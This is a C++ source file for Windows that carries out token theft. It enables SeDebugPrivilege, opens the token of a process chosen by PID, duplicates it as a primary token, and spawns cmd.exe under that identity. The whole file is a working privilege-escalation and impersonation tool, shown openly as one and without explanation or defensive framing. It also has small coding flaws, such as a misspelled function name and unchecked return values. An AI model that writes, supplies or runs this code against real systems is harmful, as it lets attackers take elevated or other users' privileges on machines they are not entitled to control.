#include <windows.h>
#include <iostream>
#include <Lmcons.h>

BOOL SePrivTokenrivilege(
	HANDLE hToken,          
	LPCTSTR lpszPrivilege, 
	BOOL bEnablePrivilege  
)
{
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            
		lpszPrivilege,  
		&luid))       
	{
		return FALSE;
	}

	TOKEN_PRIVILEGES PrivToken;
	PrivToken.PrivilegeCount = 1;
	PrivToken.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		PrivToken.Privileges[0].Attributes = 0;


	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&PrivToken,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		return FALSE;
	}

	return TRUE;
}

int main(int argc, char** argv) {

	char* pid_c = argv[1];
	


	HANDLE hDpToken = NULL;
	
	

	HANDLE hCurrentToken = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
	if (SePrivTokenrivilege(hCurrentToken, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege!\n");
	}

	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);


	HANDLE hToken = NULL;
	BOOL TokenRet = OpenProcessToken(hProcess,
		TOKEN_DUPLICATE |
		TOKEN_ASSIGN_PRIMARY |
		TOKEN_QUERY, &hToken);

	BOOL impersonateUser = ImpersonateLoggedOnUser(hToken);
	if (GetLastError() == NULL)
	{
		RevertToSelf();
	}


	BOOL dpToken = DuplicateTokenEx(hToken, 
		TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID |
		TOKEN_QUERY |
		TOKEN_DUPLICATE |
		TOKEN_ASSIGN_PRIMARY,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&hDpToken
	);


	STARTUPINFO startupInfo;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	startupInfo.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));

	BOOL Ret = CreateProcessWithTokenW(hDpToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);


	return TRUE;
}